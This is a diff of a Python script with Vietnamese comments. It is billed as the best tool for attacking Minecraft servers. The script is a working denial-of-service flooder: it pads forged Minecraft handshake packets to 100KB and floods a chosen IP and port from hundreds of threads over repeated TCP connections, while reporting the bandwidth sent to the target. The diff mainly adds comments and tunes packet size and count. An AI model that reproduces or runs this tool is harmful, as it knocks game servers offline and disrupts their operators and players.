@@ -13,44 +13,41 @@
 #
 # [==========================================================================================]
 
-
-# Nhập thư viện Python
+# =================== = NHẬP THƯ VIỆN PYTHON ====================
 import os
 import socket
 import threading
 import time
 import struct
 
-#Cấu hình tấn công
-PACKET_PER_CONN = 1000
-STATS_INTERVAL = 1  
-DATA_PER_PACKET = 5000000
-total_sent = 0
-lock = threading.Lock()
+# ===================== CẤU HÌNH TẤN CÔNG =======================
+PACKET_PER_CONN = 10000          # Số gói gửi mỗi kết nối TCP
+STATS_INTERVAL = 1               # Thời gian cập nhật thống kê mỗi giây
+DATA_PER_PACKET = 102400         # Kích thước mỗi gói dữ liệu gửi (100KB) để làm nghẽn băng thông
+total_sent = 0                   # Tổng số byte đã gửi (được thống kê)
+lock = threading.Lock()          # Khóa để tránh xung đột khi nhiều luồng cập nhật biến total_sent
 
-# Hàm khởi động chương trình
+# ===================== GIAO DIỆN CHÍNH ========================
 def startup():
+    # Xoá màn hình tùy theo hệ điều hành, sau đó hiện logo và menu
     os.system('cls' if os.name == 'nt' else 'clear')
     logo()
     menu()
 
-# Hàm in logo
 def logo():
-    print(
-        """
-
+    # In logo + thông tin tác giả
+    print("""
         ███╗   ██╗██████╗ ██████╗  ██████╗ ███████╗
         ████╗  ██║╚════██╗██╔══██╗██╔═══██╗██╔════╝
         ██╔██╗ ██║ █████╔╝██║  ██║██║   ██║███████╗
         ██║╚██╗██║ ╚═══██╗██║  ██║██║   ██║╚════██║
         ██║ ╚████║██████╔╝██████╔╝╚██████╔╝███████║
         ╚═╝  ╚═══╝╚═════╝ ╚═════╝  ╚═════╝ ╚══════╝
-                                           
         Công cụ tấn công máy chủ Minecraft tốt nhất
-        Tác giả: N3Co4     
-        """)
+        Tác giả: N3Co4
+    """)
 
-# Hàm in menu chính
+# In menu
 def menu():
     while True:
         print("[", "="*60, "]")
@@ -94,41 +91,43 @@ def menu():
 
         elif choice == '4':
             os.system('cls' if os.name == 'nt' else 'clear')
-            print("Thoát chương trình.")
+            print("Cảm ơn đã sử dụng chương trình của tôi!")
             exit()
         else:
             os.system('cls' if os.name == 'nt' else 'clear')
             print("Lựa chọn không hợp lệ, vui lòng thử lại.\n")
 
-# Tạo packet giả mạo
+# ===================== XÂY DỰNG GÓI TIN GIẢ =======================
 def build_fake_packet(ip, port):
-    ip_bytes = ip.encode()
-    packet = b'\x00' + b'\x04'
-    packet += struct.pack('>B', len(ip_bytes)) + ip_bytes
-    packet += struct.pack('>H', port)
-    packet += b'\x01'
-    handshake = struct.pack('>B', len(packet)) + packet
-    request = b'\x01\x00'
+    # Tạo một gói tin giả (fake packet) theo định dạng handshake của Minecraft
+    ip_bytes = ip.encode()                   # Chuyển IP thành bytes
+    packet = b'\x00' + b'\x04'               # Gói handshake header (protocol version + next state)
+    packet += struct.pack('>B', len(ip_bytes)) + ip_bytes   # Thêm độ dài IP và IP
+    packet += struct.pack('>H', port)        # Thêm cổng (2 byte, dạng big-endian)
+    packet += b'\x01'                        # State = status
+    handshake = struct.pack('>B', len(packet)) + packet      # Thêm chiều dài gói đầu
+    request = b'\x01\x00'                    # Yêu cầu status
+    # Trả về gói handshake + request và đệm thêm dữ liệu rác để đủ kích thước mỗi packet
     return handshake + request + b'\x00' * (DATA_PER_PACKET - len(handshake + request))
 
-# Gửi packet giả mạo
+# ===================== LUỒNG GỬI DỮ LIỆU =======================
 def sender(ip, port):
     global total_sent
-    packet = build_fake_packet(ip, port)
+    packet = build_fake_packet(ip, port)  # Chuẩn bị gói tin cần gửi
     while True:
         try:
-            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
-            s.connect((ip, port))
-            for _ in range(PACKET_PER_CONN):
-                s.sendall(packet)
-                with lock:
-                    total_sent += len(packet)
-            s.close()
+            # Tạo kết nối TCP
+            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
+                s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)  # Tắt Nagle để gửi ngay
+                s.connect((ip, port))  # Kết nối tới mục tiêu
+                for _ in range(PACKET_PER_CONN):
+                    s.sendall(packet)  # Gửi gói tin
+                    with lock:
+                        total_sent += len(packet)  # Cập nhật tổng số byte đã gửi
         except:
-            continue
+            continue  # Nếu lỗi kết nối thì tiếp tục thử lại
 
-# In thông tin thống kê
+# ===================== IN THỐNG KÊ TỐC ĐỘ GỬI =======================
 def stats_printer():
     global total_sent
     prev = 0
@@ -138,27 +137,31 @@ def stats_printer():
             now = total_sent
         delta = now - prev
         prev = now
-        mbps = (delta * 8) / (STATS_INTERVAL * 1024 * 1024)
-        mb = delta / (1024 * 1024)
+        mbps = (delta * 8) / (1024 * 1024)   # Đổi sang Mbps
+        mb = delta / (1024 * 1024)           # Đổi sang MB
         print(f"[+] Đã gửi {mb:.2f} MB tới mục tiêu ({mbps:.2f} Mbps)")
 
-# Hàm chính để tấn công máy chủ Minecraft
+# ===================== CHẠY TẤN CÔNG MINECRAFT =======================
 def attack_minecraft():
     os.system('cls' if os.name == 'nt' else 'clear')
-    ip = input("Nhập IP máy chủ (VD 127.0.0.1): ").strip()
+    # Nhập thông tin từ người dùng
+    ip = input("Nhập IP máy chủ: ").strip()
     port = int(input("Nhập cổng (VD 25565): ").strip())
-    thread_count = int(input("Số thread gửi (VD 10000): "))
+    thread_count = int(input("Số thread gửi (VD 500): ").strip())
 
+    print(f"\nĐang gửi dữ liệu đến {ip}:{port} với {thread_count} threads...\n")
+
+    # Tạo luồng in thống kê
     threading.Thread(target=stats_printer, daemon=True).start()
 
-    print(f"Đang tấn công đến {ip}:{port} \n")
+    # Tạo các luồng tấn công
     for _ in range(thread_count):
         t = threading.Thread(target=sender, args=(ip, port), daemon=True)
         t.start()
 
     while True:
-        time.sleep(1)
+        time.sleep(1)  # Giữ chương trình luôn chạy
 
-# Chạy chương trình
+# ===================== CHẠY CHƯƠNG TRÌNH =======================
 if __name__ == '__main__':
     startup()
